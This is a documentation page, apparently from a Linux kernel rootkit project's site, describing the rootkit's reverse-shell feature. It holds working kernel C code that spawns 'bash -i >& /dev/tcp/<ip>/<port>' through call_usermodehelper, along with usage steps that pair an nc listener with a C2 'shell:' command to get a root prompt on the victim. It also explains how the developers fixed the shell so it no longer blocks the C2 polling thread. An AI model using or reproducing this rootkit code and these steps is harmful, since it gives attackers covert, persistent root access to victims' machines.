---
import FeaturePage from '../../layouts/FeaturePage.astro';
---

<FeaturePage
  title="Reverse Shell"
  description="Opens an interactive bash session from the victim back to the attacker over a raw TCP connection."
  badge="Bonus"
  slug="reverse-shell"
  prev={{ href: "/features/upload-download", label: "Upload / Download" }}
  next={{ href: "/features/hide-module", label: "Hide Module" }}
>

<section class="section">
  <h2 class="section-title">// How it works</h2>
  <div class="prose">
    <p>
      A reverse shell is a shell that connects <em>outward</em> from the victim to the attacker,
      bypassing firewalls that block incoming connections. The attacker sets up a TCP listener
      (<code>nc -lvnp 4444</code>), then sends the <code>shell:&lt;ip&gt;,&lt;port&gt;</code> action
      to the rootkit.
    </p>
    <p>
      The rootkit spawns <code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code>
      via <code>call_usermodehelper()</code> with <strong><code>UMH_WAIT_EXEC</code></strong>, meaning
      the kernel thread only waits until <code>execve</code> completes, then returns immediately.
      The bash process keeps running in the background, so the C2 polling thread is never blocked.
    </p>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Network diagram</h2>
  <div class="diagram">
    <svg viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" font-family="'Courier New',monospace">
      <defs>
        <marker id="a" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L0,6 L8,3 z" fill="#00ff41"/></marker>
      </defs>
      <!-- Attacker box -->
      <rect x="20" y="70" width="200" height="70" rx="6" fill="#161b22" stroke="#00ff41" stroke-width="1" stroke-opacity="0.5"/>
      <text x="120" y="95" text-anchor="middle" fill="#e6edf3" font-size="12" font-weight="bold">Attacker</text>
      <text x="120" y="113" text-anchor="middle" fill="#8b949e" font-size="10">nc -lvnp 4444</text>
      <text x="120" y="128" text-anchor="middle" fill="#00ff41" font-size="10">LISTENING :4444</text>

      <!-- Victim box -->
      <rect x="460" y="70" width="200" height="70" rx="6" fill="#161b22" stroke="#e3b341" stroke-width="1" stroke-opacity="0.5"/>
      <text x="560" y="95" text-anchor="middle" fill="#e6edf3" font-size="12" font-weight="bold">Victim</text>
      <text x="560" y="113" text-anchor="middle" fill="#8b949e" font-size="10">rootkit receives</text>
      <text x="560" y="128" text-anchor="middle" fill="#e3b341" font-size="10">shell:10.0.2.2,4444</text>

      <!-- Connection arrow (victim initiates) -->
      <line x1="460" y1="105" x2="225" y2="105" stroke="#00ff41" stroke-width="2" marker-end="url(#a)"/>
      <text x="342" y="98" text-anchor="middle" fill="#8b949e" font-size="10">TCP connect (victim → attacker)</text>
      <text x="342" y="120" text-anchor="middle" fill="#8b949e" font-size="10">bash -i &gt;&amp; /dev/tcp/10.0.2.2/4444 0&gt;&amp;1</text>

      <!-- Labels -->
      <text x="120" y="165" text-anchor="middle" fill="#8b949e" font-size="10">interactive shell session</text>
      <text x="560" y="165" text-anchor="middle" fill="#8b949e" font-size="10">stdout/stdin redirected over TCP</text>
    </svg>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Implementation</h2>
  <div class="code-block">
    <div class="code-header"><span>rootkit/src/exec.c : reverse_shell()</span><span class="lang">C</span></div>
    <pre><code>{`void reverse_shell(char *ip, unsigned int port)
{
    char *cmd = kmalloc(256, GFP_KERNEL);
    // bash built-in: redirect stdio over a TCP socket
    snprintf(cmd, 256,
             "bash -i >& /dev/tcp/%s/%u 0>&1", ip, port);

    char *argv[] = { "/bin/bash", "-c", cmd, NULL };
    char *envp[] = { "HOME=/",
                     "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
                     "TERM=xterm",   // needed for interactive programs
                     NULL };

    sub_info = call_usermodehelper_setup(argv[0], argv, envp, ...);

    // UMH_WAIT_EXEC: return once execve() finishes.
    // bash keeps running in background : polling thread is NOT blocked.
    call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
    kfree(cmd);
}`}</code></pre>
  </div>
  <div class="callout">
    <span class="callout-icon">💡</span>
    <p><strong>UMH_WAIT_EXEC vs UMH_WAIT_PROC</strong>, <code>exec</code> is used here on purpose: the kernel thread returns as soon as bash starts, not when the session ends. The C2 polling continues normally while the shell session runs in parallel.</p>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// Usage</h2>
  <div class="code-block">
    <div class="code-header"><span>Usage</span></div>
    <pre><code>{`# 1. On attacker machine : open a listener
nc -lvnp 4444

# 2. In C2 dashboard : send action
shell:10.0.2.2,4444

# 3. Interactive shell appears in the nc terminal
root@victim:~#`}</code></pre>
  </div>
</section>

<section class="section">
  <h2 class="section-title">// What we tried first</h2>
  <div class="prose">
    <p>
      The first version used <code>UMH_WAIT_PROC</code>, the same wait flag as <code>exec_command()</code>.
      That flag blocks the caller until the child process exits entirely.
      For a short-lived command this is fine, but a reverse shell stays open for as long as
      the attacker keeps the session alive, which could be hours.
    </p>
  </div>

  <div class="fail-box">
    <div class="fail-title">Problem: UMH_WAIT_PROC freezes the polling thread</div>
    <pre><code>{`// With UMH_WAIT_PROC the kthread is blocked for the shell's entire lifetime.
// The rootkit cannot receive any new commands while the session is open.
// If the attacker forgets to close it, the machine is effectively bricked
// from the C2's perspective.
call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);  // wrong for shells

// Fix: UMH_WAIT_EXEC returns as soon as exec() succeeds in the child.
// The shell runs freely in the background; the polling loop continues normally.
call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);  // correct`}</code></pre>
  </div>
</section>

